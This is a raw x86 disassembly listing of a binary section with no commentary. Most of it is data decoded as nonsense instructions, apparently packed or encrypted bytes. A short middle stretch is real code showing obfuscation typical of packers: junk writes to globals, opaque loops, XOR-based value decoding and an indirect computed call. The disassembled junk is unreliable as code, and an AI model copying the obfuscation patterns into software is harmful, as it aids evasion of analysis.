  4118f2:	test   eax,0x2b1a4d63
  4118f7:	das    
  4118f8:	repz call 0x51f7:0xdcf7b704
  411900:	icebp  
  411901:	call   0x4b5e:0x88853baa
  411908:	scas   eax,DWORD PTR es:[edi]
  411909:	pop    ecx
  41190a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41190b:	mov    ecx,0xabbdc5b8
  411910:	ins    DWORD PTR es:[edi],dx
  411911:	jp     0x411954
  411913:	sbb    eax,edx
  411915:	fstp   TBYTE PTR [edi+eiz*8-0x381d9a19]
  41191c:	(bad)
  41191f:	por    mm3,mm6
  411922:	jne    0x4118ea
  411924:	push   cs
  411925:	jnp    0x41198d
  411927:	cs loope 0x4118b4
  41192a:	ins    BYTE PTR es:[edi],dx
  41192b:	push   eax
  41192c:	jb     0x4118fa
  41192e:	cmp    bh,dl
  411930:	mov    al,0xc1
  411932:	or     BYTE PTR [ecx-0x42903d2],0x9d
  411939:	mov    ds:0x594ba8b7,al
  41193e:	sub    eax,0x1cddc8a4
  411943:	addr16 (bad) 
  411945:	int    0x44
  411947:	cmp    cl,BYTE PTR [ecx+0x59]
  41194a:	sbb    dh,BYTE PTR [esi-0x55]
  41194d:	xor    ah,BYTE PTR [eax]
  41194f:	neg    BYTE PTR [eax]
  411951:	pop    ebx
  411952:	xchg   DWORD PTR [ebx-0x3d3a5c7],edi
  411958:	(bad)  
  411959:	(bad)  
  41195a:	jmp    0xbb20:0xd35f3f16
  411961:	fnsave [ebx]
  411963:	pusha  
  411964:	std    
  411965:	stos   BYTE PTR es:[edi],al
  411966:	push   ebp
  411967:	xor    ah,BYTE PTR [ecx-0x797a5623]
  41196d:	div    ah
  41196f:	aaa    
  411970:	jo     0x41190e
  411972:	das    
  411973:	popa   
  411974:	mov    edx,DWORD PTR [esi-0x2421766f]
  41197a:	leave  
  41197b:	mov    eax,ds:0x415f0321
  411980:	push   edi
  411981:	in     eax,0x44
  411983:	out    dx,al
  411984:	ss dec esi
  411986:	repz test eax,0x1b5201a0
  41198c:	gs ja  0x41192c
  41198f:	mov    dh,0xd6
  411991:	mov    ebp,0xc8b5da1b
  411996:	and    eax,0x251a3a00
  41199b:	add    BYTE PTR [esi-0x72],ch
  41199e:	sub    cl,BYTE PTR [edx]
  4119a0:	inc    esp
  4119a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a2:	sub    esi,ebp
  4119a4:	jnp    0x41197e
  4119a6:	pop    ss
  4119a7:	lock ror ebp,0x7d
  4119ab:	adc    BYTE PTR [esi+ebx*2+0xcdf9d78],cl
  4119b2:	imul   edi,DWORD PTR [ecx],0x9180fa81
  4119b8:	ins    BYTE PTR es:[edi],dx
  4119b9:	cmovne edi,DWORD PTR [edx+0x7c]
  4119bd:	mov    BYTE PTR [ecx+eiz*8],ah
  4119c0:	lea    ebp,[edx+0x5e]
  4119c3:	xchg   ebx,eax
  4119c4:	cmp    cl,BYTE PTR [eax-0x1f]
  4119c7:	mov    esp,0x39a42741
  4119cc:	setg   BYTE PTR [ecx-0x37]
  4119d0:	mov    al,ds:0xed280097
  4119d5:	xchg   esi,eax
  4119d6:	push   cs
  4119d7:	mov    bh,0xc
  4119d9:	and    BYTE PTR [edi+0x28],dl
  4119dc:	lahf   
  4119dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119de:	aam    0x16
  4119e0:	adc    edi,DWORD PTR [edi-0x56823e4d]
  4119e6:	lahf   
  4119e7:	inc    esi
  4119e8:	mov    cs,ecx
  4119ea:	pop    esi
  4119eb:	add    DWORD PTR [eax+0x5e],edx
  4119ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ef:	sbb    ebx,esi
  4119f1:	xor    DWORD PTR [eax-0x2a3d90ba],edi
  4119f7:	sub    al,BYTE PTR [eax]
  4119f9:	xchg   edx,eax
  4119fa:	fdivrp st(5),st
  4119fc:	or     al,0xd9
  4119fe:	cdq    
  4119ff:	sbb    al,0x61
  411a01:	cs xchg edx,eax
  411a03:	addr16 pop esi
  411a05:	imul   ebx,DWORD PTR [esi-0x67c3c387],0xf23d33dc
  411a0f:	out    dx,al
  411a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a11:	(bad)  
  411a12:	fdivp  st(4),st
  411a14:	and    DWORD PTR [ebx*2+0x2c2617f1],eax
  411a1b:	pop    ss
  411a1c:	sub    ebx,ebx
  411a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a1f:	daa    
  411a20:	push   0x3a
  411a22:	jg     0x411a4c
  411a24:	xor    ecx,esi
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42a9db
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42a9df
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax-0x16fb3ae3]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx-0x10bf1e97],0x50
  411d3c:	test   DWORD PTR [ebx+edi*1],edx
  411d3f:	repnz (bad) 
  411d41:	jne    0x411d16
  411d43:	jnp    0x411d37
  411d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d46:	mov    bl,0xe9
  411d48:	(bad)  
  411d49:	cdq    
  411d4a:	add    al,0xed
  411d4c:	popa   
  411d4d:	ds mov ah,0x65
  411d50:	push   ebx
  411d51:	int    0x14
  411d53:	mov    ah,0xd9
  411d55:	ret    
  411d56:	sub    ecx,DWORD PTR [ebx]
  411d58:	xchg   ecx,eax
  411d59:	pop    eax
  411d5a:	jmp    0xf5e2:0x974fb79e
  411d61:	push   ebx
  411d62:	cmp    BYTE PTR [eax+0x2],bh
  411d65:	sbb    bh,BYTE PTR [ebx]
  411d67:	lock and esi,edi
  411d6a:	call   0x9daaa6cc
  411d6f:	mov    ebx,DWORD PTR [esi]
  411d71:	test   eax,0x92a87469
  411d76:	cmc    
  411d77:	cli    
  411d78:	add    DWORD PTR [edi+0xc],esi
  411d7b:	loop   0x411dc4
  411d7d:	jmp    0x411da5
  411d7f:	aad    0x69
  411d81:	scas   eax,DWORD PTR es:[edi]
  411d82:	arpl   WORD PTR [ecx+0x3c],bp
  411d85:	cwde   
  411d86:	sahf   
  411d87:	dec    esp
  411d88:	int3   
  411d89:	repz aaa 
  411d8b:	imul   bh
  411d8d:	adc    ecx,edx
  411d8f:	xchg   edi,eax
  411d90:	psubusb mm3,QWORD PTR [esi-0x70ad421c]
  411d97:	nop
  411d98:	add    edi,esi
  411d9a:	push   edi
  411d9b:	ds fsubp st(3),st
  411d9e:	or     dh,BYTE PTR [ecx+0x25a64a9a]
  411da4:	stos   DWORD PTR es:[edi],eax
  411da5:	lds    ecx,FWORD PTR [ebx]
  411da7:	bound  esp,QWORD PTR ds:0x2b2eaf5c
  411dad:	mov    esi,0x2af68efc
  411db2:	fild   DWORD PTR [ebx-0x4c3b94fe]
  411db8:	push   ebp
  411db9:	inc    edi
  411dba:	das    
  411dbb:	dec    ebx
  411dbc:	fnsave [ecx-0x18]
  411dbf:	clc    
  411dc0:	xor    DWORD PTR [ebp+ecx*8+0x59],ebp
  411dc4:	push   es
  411dc5:	fadd   QWORD PTR [ebx+0x2b]
  411dc8:	test   BYTE PTR [edi],dl
  411dca:	xor    eax,0x611403dd
  411dcf:	mov    WORD PTR [edx+0x3d97610f],gs
  411dd5:	imul   esp,DWORD PTR [edi],0x7bc5bb0d
  411ddb:	sbb    ecx,DWORD PTR [edi+0x2b]
  411dde:	xchg   ebx,eax
  411ddf:	dec    edx
  411de0:	push   es
  411de1:	js     0x411d83
  411de3:	pop    ecx
  411de4:	inc    ecx
  411de5:	fsub   QWORD PTR [edi-0x331a1c1f]
  411deb:	fist   WORD PTR [ecx+0x5d1744cd]
  411df1:	test   eax,0x88bb5bfd
  411df6:	aas    
  411df7:	loope  0x411d7b
  411df9:	adc    ebx,DWORD PTR [esi]
  411dfb:	push   esi
  411dfc:	mov    ds:0x5f86d67,eax
  411e01:	clc    
  411e02:	lds    edi,FWORD PTR [ebx+edi*8]
  411e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e06:	xchg   ecx,eax
  411e07:	xor    DWORD PTR [eax],esi
  411e09:	fcomp  DWORD PTR [eax+0x1931e9ca]
  411e0f:	outs   dx,BYTE PTR ds:[esi]
  411e10:	loop   0x411d9a
  411e12:	std    
  411e13:	les    edx,FWORD PTR [edi+0x49aca173]
  411e19:	(bad)  
  411e1b:	fisub  DWORD PTR [esi+0x2c]
  411e1e:	push   eax
  411e1f:	popa   
  411e20:	lods   al,BYTE PTR ds:[esi]
  411e21:	jo     0x411de7
  411e23:	fsub   QWORD PTR [esp+eax*4]
  411e26:	arpl   WORD PTR [eax+0x4e0ce0d7],bx
  411e2c:	push   cs
  411e2d:	add    al,0x21
  411e2f:	into   
  411e30:	ja     0x411de8
  411e32:	shr    BYTE PTR [edi+0x7f],cl
  411e35:	sbb    DWORD PTR [esi],edx
  411e37:	ror    DWORD PTR [ebx+esi*1+0x197a365d],0xb3
  411e3f:	sub    DWORD PTR [ecx-0x671d2b37],ecx
  411e45:	xor    dl,ch
  411e47:	ja     0x411e5c
  411e49:	pop    edx
  411e4a:	shl    al,cl
  411e4c:	fbld   TBYTE PTR [ecx+eax*2+0x1c]
  411e50:	das    
  411e51:	dec    ebx
  411e52:	mov    ecx,0x9007c881
  411e57:	cmp    cl,BYTE PTR ds:0x6e886255
  411e5d:	lahf   
  411e5e:	das    
  411e5f:	sbb    DWORD PTR [edx-0x80],esi
  411e62:	xor    al,0x64
  411e64:	in     eax,dx
  411e65:	cmp    ah,bl
  411e67:	jmp    0x411e93
  411e69:	dec    ebx
  411e6a:	(bad)  
  411e6b:	fstp   TBYTE PTR [ecx]
  411e6d:	int    0xa2
  411e6f:	adc    BYTE PTR [edi-0x7c469b31],ch
  411e75:	int3   
  411e76:	sub    ebx,DWORD PTR [esi-0x63064d13]
  411e7c:	mov    al,0xc4
  411e7e:	repz inc edx
  411e80:	dec    ecx
  411e81:	mov    ?,edi
  411e83:	nop
  411e84:	mov    cl,0x2f
  411e86:	mov    dh,0x28
  411e88:	lock sub eax,0x983c72a8
  411e8e:	fldcw  WORD PTR [esi+0xa]
  411e91:	out    dx,al
  411e92:	sbb    esi,DWORD PTR [eax+0x49]
  411e95:	imul   DWORD PTR [esi+edx*2-0x3c]
  411e99:	sbb    esi,DWORD PTR [esi-0x59bf3549]
  411e9f:	ins    DWORD PTR es:[edi],dx
  411ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea2:	fsub   QWORD PTR [ebp+0x70]
  411ea5:	int3   
  411ea6:	scas   eax,DWORD PTR es:[edi]
  411ea7:	pop    esi
  411ea8:	or     eax,0x8c1f49fa
  411ead:	addr16 pop ebp
  411eaf:	add    DWORD PTR [ecx],eax
  411eb1:	sti    
  411eb2:	add    al,0x82
  411eb4:	rol    DWORD PTR ds:0x4fc2f0bb,0xa0
  411ebb:	out    0x20,eax
  411ebd:	mov    dh,0x88
  411ebf:	les    esp,FWORD PTR [edi+0x63]
  411ec2:	shl    DWORD PTR [edi],cl
  411ec4:	test   DWORD PTR [edi],0x90de66fa
  411eca:	push   es
  411ecb:	es jmp 0xa3731599
  411ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ed2:	out    0xfa,eax
  411ed4:	test   BYTE PTR [ecx],ah
  411ed6:	pop    ds
  411ed7:	push   ebp
  411ed8:	leave  
  411ed9:	jne    0x411eeb
  411edb:	ins    BYTE PTR es:[edi],dx
  411edc:	mov    eax,0x45f7479c
  411ee1:	mov    eax,0x5e752a44
  411ee6:	push   ecx
  411ee7:	mov    ch,0xe8
  411ee9:	in     eax,dx
  411eea:	jmp    DWORD PTR [ebp+0x3a8c1b93]
  411ef0:	push   0xa35efc09
  411ef5:	mov    ecx,0xcfc090b2
  411efa:	mov    eax,0xa5fccdc8
  411eff:	test   DWORD PTR [eax-0x67],ebp
  411f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f03:	dec    edi
  411f04:	push   cs
  411f05:	ret    
  411f06:	sub    ebx,edx
  411f08:	mov    edx,0xc893221b
  411f0d:	mov    eax,0xcd4341b5
  411f12:	(bad)  
  411f14:	jmp    0x70358fc5
  411f19:	sar    DWORD PTR [ecx-0x4],1
  411f1c:	dec    esp
  411f1d:	data16 jno 0x411f7d
  411f20:	inc    edi
  411f21:	adc    DWORD PTR ds:0xd75e798f,esi
  411f27:	mov    al,0xb3
  411f29:	sbb    eax,0xd8afeabe
  411f2e:	js     0x411f4d
  411f30:	lock sub ebx,DWORD PTR [esi+0x4f]
  411f34:	loope  0x411f10
  411f36:	fist   WORD PTR [ebx]
  411f38:	hlt    
  411f39:	jmp    0x9e528a94
  411f3e:	xchg   edx,eax
  411f3f:	inc    edx
  411f40:	js     0x411ef1
  411f42:	outs   dx,DWORD PTR ds:[esi]
  411f43:	xchg   BYTE PTR [ebx+0x90c33c1],al
  411f49:	cli    
  411f4a:	stc    
  411f4b:	ja     0x411f41
  411f4d:	mov    ds:0xfea6b4b0,al
  411f52:	push   0x5
  411f54:	enter  0xb648,0xf5
  411f58:	mov    ds:0x395ed49a,eax
  411f5d:	jno    0x411f5d
  411f5f:	sub    BYTE PTR [eax+0x20],bl
  411f62:	xchg   ecx,eax
  411f63:	lea    edx,[ebx-0x23]
  411f66:	xchg   esi,eax
  411f67:	jo     0x411fe7
  411f69:	(bad)  
  411f6a:	inc    dl
  411f6c:	(bad)  
  411f6d:	or     al,0x28
  411f6f:	mov    esp,0x8e37af78
  411f74:	in     eax,dx
  411f75:	push   0x7c247034
  411f7a:	jnp    0x411f99
  411f7c:	jmp    0x343f:0x63bb6dec
  411f83:	js     0x411f46
  411f85:	add    al,0x7a
  411f87:	or     al,0x76
  411f89:	(bad)
  411f8d:	inc    edx
  411f8e:	xor    ebp,DWORD PTR [ecx+edx*8+0x3d186d5a]
  411f95:	push   ebx
  411f96:	xchg   edx,eax
  411f97:	mov    DWORD PTR [ebx+0x0],esp
  411f9a:	ins    BYTE PTR es:[edi],dx
  411f9b:	pop    ebx
  411f9c:	pop    esi
  411f9d:	or     BYTE PTR [edi+0x23],0xa5
  411fa1:	mov    ebx,0x33526fdc
  411fa6:	lods   eax,DWORD PTR ds:[esi]
  411fa7:	in     eax,dx
  411fa8:	in     eax,0xc4
  411faa:	xchg   esp,eax
  411fab:	(bad)  
  411fac:	jp     0x411fe5
  411fae:	push   ebx
  411faf:	test   eax,0xf2c1e6bf
  411fb4:	add    eax,0x616dba0c
  411fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fba:	dec    ebp
  411fbb:	jp     0x41200d
  411fbd:	and    BYTE PTR [ebx+0x5e53fcbb],dl
  411fc3:	repnz aaa 
  411fc5:	mov    ch,0xc9
  411fc7:	(bad)  
  411fc8:	push   edi
  411fc9:	sbb    BYTE PTR [edx+0x6b4fc8db],al
  411fcf:	(bad)  
  411fd0:	push   esi
  411fd1:	mov    dh,0x25
  411fd3:	mov    BYTE PTR [ebx],0xdb
  411fd6:	jmp    0x3afe731a
  411fdb:	sbb    edi,DWORD PTR [ebp+0xb]
  411fde:	fidivr DWORD PTR [ebp+ecx*8+0x46acfcd0]
  411fe5:	imul   ecx,ebp,0xc643f583
  411feb:	scas   eax,DWORD PTR es:[edi]
  411fec:	fwait
  411fed:	inc    edx
  411fee:	out    dx,al
  411fef:	xor    DWORD PTR ds:0xb093c67,eax
  411ff5:	rcl    BYTE PTR [esi-0x2e],cl
  411ff8:	mov    ecx,0x869e40d
  411ffd:	push   esi
  411ffe:	out    dx,eax
  411fff:	mov    WORD PTR [ecx+0x55],?
  412002:	jae    0x411fb7
  412004:	dec    esi
  412005:	ja     0x411f8b
  412007:	xor    ecx,DWORD PTR cs:[eax-0x6c43e425]
  41200e:	inc    ebp
  41200f:	pop    edi
  412010:	punpckhwd mm4,QWORD PTR [esi-0x1f]
  412014:	mov    bh,0x81
  412016:	or     al,0x40
  412018:	mov    edi,0xf439821e
  41201d:	xchg   ecx,eax
  41201e:	fwait
  41201f:	int    0x18
  412021:	pop    ebp
  412022:	cli    
  412023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412024:	xor    al,0xe6
  412026:	sahf   
  412027:	pop    ebp
  412028:	mov    ecx,esi
  41202a:	fld    TBYTE PTR [edi+0x36]
  41202d:	loope  0x412080
  41202f:	sub    BYTE PTR [edx+0x70],0xd1
  412033:	cwde   
  412034:	pop    edx
  412035:	fsub   QWORD PTR [esi+edi*4-0x39]
  412039:	out    dx,eax
  41203a:	in     eax,dx
  41203b:	shr    BYTE PTR [eax],cl
  41203d:	jmp    0x94105341
  412042:	pop    ds
  412043:	push   ss
  412044:	push   cs
  412045:	leave  
  412046:	dec    al
  412048:	aaa    
  412049:	test   DWORD PTR [eax+eiz*4+0x5bea0e79],ebp
  412050:	call   ebx
  412052:	fmul   st,st(2)
  412054:	fdivr  DWORD PTR [edx-0x3c]
  412057:	pop    ds
  412058:	or     eax,0x43d1538b
  41205d:	pusha  
  41205e:	push   0xffffff83
  412060:	cmp    DWORD PTR [edx+0x136fe622],0x680a866a
  41206a:	lahf   
  41206b:	cdq    
  41206c:	push   ebp
  41206d:	cmp    dl,ah
  41206f:	sub    eax,0xd0b2f73f
  412074:	mov    al,BYTE PTR [esi-0x41]
  412077:	inc    esi
  412078:	shr    DWORD PTR [ebx],1
  41207a:	adc    ecx,DWORD PTR [ebp-0x21578539]
  412080:	cdq    
  412081:	daa    
  412082:	dec    edi
  412083:	jnp    0x41202a
  412085:	mov    ebp,0x742945d3
  41208a:	loop   0x412104
  41208c:	mov    ds:0x7925294b,eax
  412091:	xchg   esi,eax
  412092:	jbe    0x412056
  412094:	mov    esp,0x7ea91c95
  412099:	add    BYTE PTR [ebx],0x59
  41209c:	in     al,dx
  41209d:	xchg   ecx,eax
  41209e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a0:	or     ebp,DWORD PTR [ecx-0x4e8b78b4]
  4120a6:	mov    esi,0xd5f134b5
  4120ab:	and    ebp,DWORD PTR [ebp+0xf]
  4120ae:	dec    esp
  4120b0:	jnp    0x412113
  4120b2:	inc    di
  4120b4:	xor    eax,0xd213bee8
  4120b9:	mov    ds:0xd2e945fe,al
  4120be:	popa   
  4120bf:	sbb    BYTE PTR [esi],dh
  4120c1:	into   
  4120c2:	pop    esi
  4120c3:	in     eax,dx
  4120c4:	xchg   ebp,eax
  4120c5:	inc    BYTE PTR [ebx]
  4120c7:	inc    ebp
  4120c8:	call   0xf7ea:0xe03fb4bd
  4120cf:	cmp    al,0x64
  4120d1:	dec    esi
  4120d2:	jl     0x4120f8
  4120d4:	add    eax,0xa632d3e4
  4120d9:	dec    edi
  4120da:	jge    0x41210a
  4120dc:	aaa    
  4120dd:	jp     0x4120e0
  4120df:	and    BYTE PTR [ebx],ch
  4120e1:	dec    ecx
  4120e2:	das    
  4120e3:	pushf  
  4120e4:	lods   eax,DWORD PTR ds:[esi]
  4120e5:	outs   dx,BYTE PTR ds:[esi]
  4120e6:	fs loop 0x412163
  4120e9:	or     ch,ah
  4120eb:	mov    esp,0x301bb75c
  4120f0:	test   DWORD PTR [ebp+ebx*1-0x53],0x234fb9a
  4120f8:	mov    eax,ds:0x2b084b48
  4120fd:	cld    
  4120fe:	pop    eax
  4120ff:	jno    0x41214f
  412101:	push   esp
  412102:	lahf   
  412103:	out    0xed,eax
  412105:	hlt    
  412106:	push   esi
  412107:	pop    edx
  412108:	and    BYTE PTR [edi],bl
  41210a:	aam    0x15
  41210c:	mov    ch,0x1a
  41210e:	jl     0x41215f
  412110:	repnz add DWORD PTR [eax],ebp
  412113:	loop   0x412117
  412115:	clc    
  412116:	std    
  412117:	out    dx,al
  412118:	test   DWORD PTR ds:0x779e328c,ecx
  41211e:	ins    DWORD PTR es:[edi],dx
  41211f:	push   ss
  412120:	lea    edx,[esi+0x32]
  412123:	or     eax,0x4154e33a
  412128:	add    edx,ebx
  41212a:	scas   al,BYTE PTR es:[edi]
  41212b:	sub    eax,0xb22dfdba
  412130:	pop    ecx
  412131:	xchg   ebp,eax
  412132:	push   ebx
  412133:	cwde   
  412134:	jae    0x412139
  412136:	mov    ds:0x99aba3f4,eax
  41213b:	push   cs
  41213c:	adc    eax,0xfbb9f5bf
  412141:	adc    BYTE PTR [eax-0x2032e38b],bl
  412147:	repnz cwde 
  412149:	mov    ecx,0x61cc53e3
  41214e:	pop    esp
  41214f:	popa   
  412150:	shl    DWORD PTR [ecx],1
  412152:	clc    
  412153:	xchg   edi,eax
  412154:	es call 0xf0e085b6
  41215a:	in     al,dx
  41215b:	inc    ecx
  41215c:	xchg   ebx,eax
  41215d:	cwde   
